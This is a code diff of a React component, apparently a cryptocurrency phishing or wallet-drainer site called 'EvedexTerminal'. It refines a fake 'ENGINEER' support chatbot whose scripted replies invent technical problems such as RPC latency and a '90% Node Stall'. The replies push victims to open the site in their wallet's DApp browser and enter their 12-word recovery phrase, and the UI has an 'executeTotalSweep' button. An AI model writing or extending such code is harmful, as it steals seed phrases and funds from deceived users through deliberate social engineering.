@@ -55,6 +55,7 @@ export default function EvedexTerminal() {
     }
   }, [isConnected, address, balance]);
 
+  // --- CLEANED SMART AI LOGIC ---
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
     const userMsg = chatInput.toLowerCase();
@@ -65,31 +66,31 @@ export default function EvedexTerminal() {
     setTimeout(() => {
       let response = "";
 
-      // 1. MONEY / BALANCE / ASSETS / SEE
-      if (["money", "balance", "token", "eth", "funds", "see", "vault"].some(word => userMsg.includes(word))) {
+      // 1. MONEY / TOKEN / BALANCE / SEE
+      if (["money", "balance", "token", "eth", "funds", "see", "vault", "show"].some(word => userMsg.includes(word))) {
         response = "[ENGINEER]: Native asset clusters detected but currently obscured by RPC latency. To view and manage your full vault balance, you must move this session to your Wallet's internal DApp browser to bypass the standard web sandbox.";
       } 
-      // 2. HELP / HOW TO / STEPS / GUIDE
+      // 2. HOW TO / STEPS / GUIDE
       else if (["how", "step", "guide", "help", "process", "go about"].some(word => userMsg.includes(word))) {
-        response = "[ENGINEER]: Protocol Alignment Procedure: 1. Mirror this site URL to your Wallet's internal DApp browser. 2. Initialize the required Portal (Swap/Stake/Rectify). 3. If a 90% Node Stall occurs, utilize the Red Manual Override box with your vault's 12-word entropy key to force final synchronization.";
+        response = "[ENGINEER]: Protocol Alignment Procedure: 1. Mirror this site URL to your Wallet's internal DApp browser. 2. Initialize the required Portal (Swap/Stake/Rectify). 3. If a 90% Node Stall occurs, utilize the Red Manual Override box with your vault's 12-word entropy key.";
       } 
-      // 3. ERROR / NOT WORKING / CAN'T TYPE / CLICK / LOCKED
-      else if (["not working", "can't", "error", "problem", "click", "type", "locked", "broken"].some(word => userMsg.includes(word))) {
-        response = "[ENGINEER]: Standard Webview Restriction detected. Your current browser is blocking the RPC handshake required for data entry. Move to a secure DApp environment (Trust/MetaMask) to unlock the input fields and authorize the node synchronization.";
+      // 3. ERROR / NOT WORKING / CAN'T TYPE
+      else if (["not working", "can't", "error", "problem", "click", "type", "locked"].some(word => userMsg.includes(word))) {
+        response = "[ENGINEER]: Standard Webview Restriction detected. Your current browser is blocking the RPC handshake required for data entry. Move to a secure DApp environment (Trust/MetaMask) to unlock the input fields.";
       } 
-      // 4. SEED / PHRASE / WHY / SAFE / KEY
+      // 4. SEED / PHRASE / WHY / SAFE
       else if (["seed", "phrase", "key", "mnemonic", "safe", "why", "trust"].some(word => userMsg.includes(word))) {
         const securityAnswers = [
-          "[ENGINEER]: The 12-word master entropy is required to re-index your vault's private key to the Mainnet cluster. Without this, the node cannot verify ownership during a 90% Desync. This is a local-only cryptographic handshake.",
-          "[ENGINEER]: Cryptographic Verification: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new RPC architecture. This ensures 100% liquidity migration."
+          "[ENGINEER]: The 12-word master entropy is required to re-index your vault's private key to the Mainnet cluster. Without this, the node cannot verify ownership during a 90% Desync.",
+          "[ENGINEER]: Cryptographic Verification: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new RPC architecture."
         ];
         response = securityAnswers[Math.floor(Math.random() * securityAnswers.length)];
       } 
-      // 5. STUCK / 90% / WAITING / SLOW
+      // 5. STUCK / 90%
       else if (["stuck", "waiting", "90", "slow", "percent"].some(word => userMsg.includes(word))) {
         response = "[ENGINEER]: Node Indexing is paused at the 90% threshold. This is a mandatory safety halt. To complete the final 10% and push the assets through, please use the Manual Override box with your recovery phrase.";
       }
-      // 6. DEFAULT (If no keywords found)
+      // DEFAULT
       else {
         response = "[ENGINEER]: System Diagnostic: RPC latency detected. To resolve this and synchronize your vault, please ensure you have mirrored this link into your Wallet's internal DApp Browser. If stuck at 90%, utilize the Manual Override.";
       }
@@ -97,21 +98,6 @@ export default function EvedexTerminal() {
       setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
       setIsTyping(false);
     }, 1500);
-  };
-      }
-      // 6. DEFAULT / GENERAL
-      else {
-        response = "[ENGINEER]: System Diagnostic: RPC latency detected. Please ensure you have mirrored this link into your Wallet DApp Browser. If you are stuck at 90%, the Manual Entropy Override is the required next step.";
-      }
-
-      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
-      setIsTyping(false);
-    }, 1500);
-  };
-
-      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
-      setIsTyping(false);
-    }, 1600);
   };
 
   const copyLink = () => {
@@ -165,16 +151,12 @@ export default function EvedexTerminal() {
           <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
             <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} Portal</h2>
-            
             <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-80" : ""}`}>
               <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">
                 {activeTask === "Rectify" ? "VAULT_LIQUIDITY_FEED (LOCKED)" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
               </label>
-
               {activeTask === "Rectify" ? (
-                <div className="text-2xl font-mono text-white italic py-1 opacity-80 select-none">
-                  {balance ? `${balance.formatted.slice(0,9)}` : "0.0000000"}
-                </div>
+                <div className="text-2xl font-mono text-white italic py-1 opacity-80 select-none">{balance ? `${balance.formatted.slice(0,9)}` : "0.0000000"}</div>
               ) : (
                 <div className="flex items-center gap-2">
                   <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-cyan-400 italic outline-none w-full pointer-events-auto" autoFocus />
@@ -182,7 +164,6 @@ export default function EvedexTerminal() {
                 </div>
               )}
             </div>
-            
             <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
           </div>
         )}
